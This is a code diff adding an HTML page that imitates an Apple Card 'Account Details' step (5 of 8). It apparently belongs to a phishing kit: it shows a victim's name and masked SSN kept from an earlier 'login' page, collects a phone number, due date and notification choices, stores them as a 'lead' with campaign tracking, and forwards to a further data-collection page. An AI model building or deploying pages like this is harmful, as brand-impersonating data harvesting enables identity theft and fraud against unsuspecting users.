@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<script src="tracker.js"></script>
+<meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Account Details — Apple Card</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+        :root{--apple-black:#1D1D1F;--apple-blue:#0071E3;--gray-100:#F5F5F7;--gray-200:#E8E8ED;--gray-300:#D2D2D7;--gray-400:#86868B;--gray-500:#6E6E73;--success:#34C759;--surface:#FFFFFF}
+        body{font-family:-apple-system,BlinkMacSystemFont,'Inter',sans-serif;background:var(--gray-100);color:var(--apple-black);-webkit-font-smoothing:antialiased;min-height:100vh}
+        .page{max-width:520px;margin:0 auto;min-height:100vh;background:var(--surface)}
+
+        .nav{display:flex;align-items:center;padding:14px 20px;border-bottom:0.5px solid var(--gray-200)}
+        .nav-back{width:32px;height:32px;display:flex;align-items:center;justify-content:center;border:none;background:var(--gray-100);border-radius:50%;cursor:pointer}
+        .nav-back svg{width:14px;height:14px;fill:var(--apple-black)}
+        .nav-title{flex:1;text-align:center;font-size:0.9375rem;font-weight:600}
+        .nav-step{font-size:0.75rem;color:var(--gray-400);width:40px;text-align:right}
+
+        .progress{height:3px;background:var(--gray-200);position:relative}
+        .progress-bar{height:100%;background:var(--apple-blue);border-radius:2px;transition:width 0.5s ease;width:60%}
+
+        .content{padding:24px 20px}
+        .section-title{font-size:1.125rem;font-weight:700;margin-bottom:4px}
+        .section-desc{font-size:0.8125rem;color:var(--gray-500);margin-bottom:24px;line-height:1.5}
+
+        /* Due date selector */
+        .due-dates{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-bottom:32px}
+        .due-date{
+            padding:14px 8px;border:2px solid var(--gray-200);border-radius:12px;
+            text-align:center;cursor:pointer;transition:all 0.2s ease;background:var(--surface);
+        }
+        .due-date:hover{border-color:var(--apple-blue)}
+        .due-date.selected{border-color:var(--apple-blue);background:rgba(0,113,227,0.04)}
+        .due-date .dd-day{font-size:1.25rem;font-weight:700;color:var(--apple-black)}
+        .due-date .dd-label{font-size:0.625rem;color:var(--gray-500);margin-top:2px}
+
+        /* Form */
+        .form-group{margin-bottom:20px}
+        .form-label{display:flex;align-items:center;gap:6px;font-size:0.8125rem;font-weight:600;margin-bottom:8px;color:var(--apple-black)}
+        .form-label svg{width:16px;height:16px;fill:var(--gray-400)}
+        .form-input{
+            width:100%;padding:14px 16px;border:1.5px solid var(--gray-200);border-radius:12px;
+            font-size:0.9375rem;font-family:inherit;color:var(--apple-black);
+            background:var(--surface);outline:none;transition:border-color 0.2s;
+        }
+        .form-input:focus{border-color:var(--apple-blue)}
+        .form-input.invalid{border-color:#FF3B30}
+        .form-input.invalid:focus{box-shadow:0 0 0 3px rgba(255,59,48,0.12)}
+        .form-input::placeholder{color:var(--gray-300)}
+        .form-hint{font-size:0.6875rem;color:var(--gray-400);margin-top:4px;padding-left:2px}
+        .form-error{display:none;font-size:0.6875rem;color:#FF3B30;margin-top:4px;padding-left:2px}
+
+        /* Phone input with country prefix */
+        .phone-wrap{position:relative;display:flex;align-items:center}
+        .phone-prefix{
+            position:absolute;left:14px;top:50%;transform:translateY(-50%);
+            display:flex;align-items:center;gap:6px;
+            font-size:0.9375rem;font-weight:600;color:var(--apple-black);
+            pointer-events:none;user-select:none;
+        }
+        .phone-prefix .pp-flag{
+            display:inline-flex;align-items:center;
+            width:22px;height:16px;border-radius:2px;overflow:hidden;
+            box-shadow:0 0 0 0.5px rgba(0,0,0,0.08);
+        }
+        .phone-prefix .pp-flag svg{display:block;width:100%;height:100%}
+        .phone-prefix .pp-divider{width:1px;height:18px;background:var(--gray-200);margin:0 2px}
+        .phone-wrap .form-input{padding-left:84px}
+
+        /* Toggle */
+        .toggle-row{display:flex;align-items:center;justify-content:space-between;padding:14px 16px;background:var(--gray-100);border-radius:12px;margin-bottom:12px}
+        .toggle-row .tr-label{font-size:0.8125rem;font-weight:500}
+        .toggle-row .tr-desc{font-size:0.6875rem;color:var(--gray-400);margin-top:2px}
+        .toggle-switch{width:44px;height:26px;background:var(--gray-300);border-radius:13px;padding:2px;cursor:pointer;transition:background 0.3s;position:relative}
+        .toggle-switch.on{background:var(--success)}
+        .toggle-switch .knob{width:22px;height:22px;background:#fff;border-radius:50%;box-shadow:0 1px 3px rgba(0,0,0,0.2);transition:transform 0.3s}
+        .toggle-switch.on .knob{transform:translateX(18px)}
+
+        .submit-btn{
+            width:100%;padding:16px;border:none;border-radius:14px;
+            font-size:1rem;font-weight:600;cursor:pointer;font-family:inherit;
+            background:var(--apple-blue);color:#fff;
+            transition:all 0.3s ease;margin-top:8px;
+        }
+        .submit-btn:hover{background:#0077ED}
+        .submit-btn:active{transform:scale(0.98)}
+        .submit-btn:disabled{opacity:0.4;cursor:not-allowed}
+
+        .secure-note{display:flex;align-items:center;justify-content:center;gap:6px;margin-top:12px;font-size:0.6875rem;color:var(--gray-400)}
+        .secure-note svg{width:12px;height:12px;fill:var(--gray-400)}
+
+        /* Session badge */
+        .session-badge{display:flex;align-items:center;gap:10px;padding:10px 14px;background:var(--gray-100);border-radius:12px;margin-bottom:18px}
+        .session-avatar{width:34px;height:34px;border-radius:50%;background:linear-gradient(135deg,var(--apple-blue),var(--success));display:flex;align-items:center;justify-content:center;font-size:0.75rem;font-weight:700;color:#fff;flex-shrink:0}
+        .session-info{flex:1;min-width:0}
+        .session-name{font-size:0.8125rem;font-weight:600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+        .session-nif{font-size:0.625rem;color:var(--gray-500);font-family:'SF Mono',monospace}
+        .session-state{font-size:0.625rem;color:var(--success);font-weight:600;display:flex;align-items:center;gap:4px}
+        .session-state .dot{width:6px;height:6px;border-radius:50%;background:var(--success)}
+    </style>
+</head>
+<body>
+    <div class="page">
+        <div class="nav">
+            <button class="nav-back" onclick="history.back()"><svg viewBox="0 0 24 24"><path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"/></svg></button>
+            <div class="nav-title">Account Details</div>
+            <div class="nav-step">5/8</div>
+        </div>
+        <div class="progress"><div class="progress-bar" style="width:62.5%"></div></div>
+
+        <div class="content">
+            <div class="session-badge" id="sessionBadge" style="display:none">
+                <div class="session-avatar" id="sessionAvatar">—</div>
+                <div class="session-info">
+                    <div class="session-name" id="sessionName">—</div>
+                    <div class="session-nif" id="sessionNif">—</div>
+                </div>
+                <div class="session-state"><span class="dot"></span>Session</div>
+            </div>
+
+            <div class="section-title">Set up your account</div>
+            <div class="section-desc">Choose your preferred statement due date and how you want to receive notifications.</div>
+
+            <div class="form-label">
+                <svg viewBox="0 0 24 24"><path d="M19 3h-1V1h-2v2H8V1H6v2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H5V8h14v11zM9 10H7v2h2v-2zm4 0h-2v2h2v-2zm4 0h-2v2h2v-2z"/></svg>
+                Statement due date
+            </div>
+            <div class="due-dates" id="dueDates">
+                <div class="due-date" onclick="selectDue(this,1)"><div class="dd-day">01</div><div class="dd-label">Every month</div></div>
+                <div class="due-date" onclick="selectDue(this,5)"><div class="dd-day">05</div><div class="dd-label">Every month</div></div>
+                <div class="due-date" onclick="selectDue(this,7)"><div class="dd-day">07</div><div class="dd-label">Every month</div></div>
+                <div class="due-date" onclick="selectDue(this,10)"><div class="dd-day">10</div><div class="dd-label">Every month</div></div>
+                <div class="due-date selected" onclick="selectDue(this,15)"><div class="dd-day">15</div><div class="dd-label">Every month</div></div>
+                <div class="due-date" onclick="selectDue(this,20)"><div class="dd-day">20</div><div class="dd-label">Every month</div></div>
+                <div class="due-date" onclick="selectDue(this,25)"><div class="dd-day">25</div><div class="dd-label">Every month</div></div>
+                <div class="due-date" onclick="selectDue(this,28)"><div class="dd-day">28</div><div class="dd-label">Every month</div></div>
+            </div>
+
+            <form id="dadosForm" onsubmit="event.preventDefault();window.submitForm();" novalidate>
+            <div class="form-group">
+                <label class="form-label" for="phone">
+                    <svg viewBox="0 0 24 24"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg>
+                    Mobile phone
+                </label>
+                <div class="phone-wrap">
+                    <div class="phone-prefix" aria-hidden="true">
+                        <span class="pp-flag" title="United States">
+                            <svg viewBox="0 0 30 20" xmlns="http://www.w3.org/2000/svg">
+                                <rect width="30" height="20" fill="#fff"/>
+                                <rect width="30" height="1.54" y="0" fill="#B22234"/>
+                                <rect width="30" height="1.54" y="3.08" fill="#B22234"/>
+                                <rect width="30" height="1.54" y="6.16" fill="#B22234"/>
+                                <rect width="30" height="1.54" y="9.24" fill="#B22234"/>
+                                <rect width="30" height="1.54" y="12.32" fill="#B22234"/>
+                                <rect width="30" height="1.54" y="15.4" fill="#B22234"/>
+                                <rect width="30" height="1.54" y="18.46" fill="#B22234"/>
+                                <rect width="12" height="10.77" fill="#3C3B6E"/>
+                            </svg>
+                        </span>
+                        <span>+1</span>
+                        <span class="pp-divider"></span>
+                    </div>
+                    <input type="tel" class="form-input" id="phone" placeholder="(XXX) XXX-XXXX" maxlength="14" inputmode="numeric" autocomplete="tel-national" oninput="maskPhone(this);validate()">
+                </div>
+                <div class="form-hint">For card notifications and support</div>
+                <div class="form-error" id="phoneErr">Invalid phone number.</div>
+            </div>
+
+            <div class="toggle-row">
+                <div>
+                    <div class="tr-label">Paperless statement</div>
+                    <div class="tr-desc">Receive statements via email</div>
+                </div>
+                <div class="toggle-switch on" id="toggleFatura" role="switch" tabindex="0" aria-checked="true" aria-label="Paperless statement" onclick="toggleSwitch(this)" onkeydown="if(event.key===' '||event.key==='Enter'){event.preventDefault();toggleSwitch(this);}"><div class="knob"></div></div>
+            </div>
+
+            <div class="toggle-row">
+                <div>
+                    <div class="tr-label">SMS notifications</div>
+                    <div class="tr-desc">Purchase and security alerts</div>
+                </div>
+                <div class="toggle-switch on" id="toggleWhatsapp" role="switch" tabindex="0" aria-checked="true" aria-label="SMS notifications" onclick="toggleSwitch(this)" onkeydown="if(event.key===' '||event.key==='Enter'){event.preventDefault();toggleSwitch(this);}"><div class="knob"></div></div>
+            </div>
+
+            <button type="submit" class="submit-btn" id="submitBtn" disabled>Continue</button>
+            </form>
+
+            <div class="secure-note">
+                <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zM9 8V6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9z"/></svg>
+                Your data is protected by encryption
+            </div>
+        </div>
+    </div>
+
+    <script>
+        (function(){var u=['utm_source','utm_medium','utm_campaign','utm_content','utm_term','src','sck'];var p=new URLSearchParams(window.location.search);u.forEach(function(k){var v=p.get(k);if(v)localStorage.setItem(k,v);});})();
+        const LeadData={_key:'applecard_lead',load(){try{return JSON.parse(localStorage.getItem(this._key)||'{}')}catch{return{}}},update(d){const c=this.load();const u={...c,...d,updated_at:Date.now()};localStorage.setItem(this._key,JSON.stringify(u));return u}};
+        function buildUrl(b,e={}){const u=new URL(b,window.location.href);new URLSearchParams(window.location.search).forEach((v,k)=>u.searchParams.set(k,v));Object.entries(e).forEach(([k,v])=>{if(v)u.searchParams.set(k,v)});return u.toString()}
+
+        LeadData.update({ page: 'dados' });
+        let selectedDueDate = 15;
+
+        // Populate session badge with user name + SSN (from login)
+        (function(){
+            var d = LeadData.load();
+            if (!d.nome && !d.ssn) return;
+            var badge = document.getElementById('sessionBadge');
+            var avatar = document.getElementById('sessionAvatar');
+            var nameEl = document.getElementById('sessionName');
+            var nifEl = document.getElementById('sessionNif');
+            var nome = String(d.nome || '—').trim();
+            var firstLetter = (nome.match(/\b[\p{L}]/u) || ['—'])[0].toUpperCase();
+            avatar.textContent = firstLetter;
+            nameEl.textContent = nome;
+            nifEl.textContent = d.ssn_masked || (d.ssn ? '***-**-' + d.ssn.slice(-4) : '—');
+            badge.style.display = '';
+        })();
+
+        function selectDue(el, day){
+            document.querySelectorAll('.due-date').forEach(d=>d.classList.remove('selected'));
+            el.classList.add('selected');
+            selectedDueDate = day;
+            validate();
+        }
+
+        function maskPhone(input){
+            let v = input.value.replace(/\D/g,'');
+            if(v.length>10) v=v.slice(0,10);
+            if(v.length>6) v=`(${v.slice(0,3)}) ${v.slice(3,6)}-${v.slice(6)}`;
+            else if(v.length>3) v=`(${v.slice(0,3)}) ${v.slice(3)}`;
+            else if(v.length>0) v=`(${v}`;
+            input.value=v;
+        }
+
+        function toggleSwitch(el){
+            el.classList.toggle('on');
+            el.setAttribute('aria-checked', el.classList.contains('on') ? 'true' : 'false');
+        }
+
+        function validate(){
+            const phone = document.getElementById('phone').value.replace(/\D/g,'');
+            // US mobile: 10 digits, area code can't start with 0 or 1
+            const phoneValid = phone.length === 10 && !'01'.includes(phone.charAt(0));
+
+            const phoneEl = document.getElementById('phone');
+            const phoneErr = document.getElementById('phoneErr');
+            phoneEl.classList.toggle('invalid', phone.length > 0 && !phoneValid);
+            if (phoneErr) phoneErr.style.display = (phone.length === 10 && !phoneValid) ? 'block' : 'none';
+
+            document.getElementById('submitBtn').disabled = !phoneValid;
+        }
+
+        // NOTE: renamed from `submit` → `submitForm` because `submit` is a native
+        // HTMLFormElement method, and inside `<form onsubmit="...">` the identifier
+        // `submit` resolves to `this.submit()` (the form method), bypassing
+        // preventDefault and forcing a page reload.
+        window.submitForm = function(){
+            const phone = document.getElementById('phone').value;
+            const phoneClean = phone.replace(/\D/g,'');
+            const faturaDigital = document.getElementById('toggleFatura').classList.contains('on');
+            const smsNotif = document.getElementById('toggleWhatsapp').classList.contains('on');
+
+            // Email was already captured on login.html — stays in LeadData
+            LeadData.update({
+                vencimento: selectedDueDate,
+                telefone: phoneClean,
+                telefone_display: phone,
+                fatura_digital: faturaDigital,
+                sms_notif: smsNotif,
+                dados_completed: true
+            });
+
+            if (window.identifyUser) window.identifyUser();
+            if (window.track) window.track('Contact', { content_id: 'apple-card-us', currency: 'USD' });
+
+            window.location.href = buildUrl('cep.html');
+        };
+    </script>
+</body>
+</html>
